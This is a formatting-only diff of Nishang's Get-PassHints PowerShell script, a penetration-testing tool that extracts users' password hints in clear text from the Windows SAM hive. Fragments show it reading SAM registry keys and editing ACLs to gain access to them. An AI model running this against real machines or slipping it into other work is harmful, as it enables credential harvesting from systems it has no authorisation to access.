@@ -1,15 +1,15 @@
 function Get-PassHints {
-<# 
-.SYNOPSIS 
+<#
+.SYNOPSIS
 Nishang script which extracts password hint for users in clear text.
- 
-.DESCRIPTION 
+
+.DESCRIPTION
 The script extracts password hints from SAM registry hive. The script needs Administrator privs to read SAM hive.
 
-.EXAMPLE 
+.EXAMPLE
 PS > Get-PassHints
- 
-.LINK 
+
+.LINK
 http://www.labofapenetrationtester.com/2015/09/extracting-windows-users-password-hints.html
 https://github.com/samratashok/nishang
 #>
@@ -41,14 +41,12 @@ Param ()
         $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
         return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
     }
-    
 
     #Logic for extracting password hint
     $users = Get-ChildItem HKLM:\SAM\SAM\Domains\Account\Users\
     $j = 0
     foreach ($key in $users)
     {
-
         $value = Get-ItemProperty $key.PSPath
         $j++
         foreach ($hint in $value)
@@ -65,7 +63,6 @@ Param ()
 
     #Remove the permissions added above.
     $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-    $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
+    $acl.Access | where {$_.IdentityReference.Value -eq $user} | % {$acl.RemoveAccessRule($_)} | Out-Null
     Set-Acl HKLM:\SAM\SAM\Domains $acl
 }
-
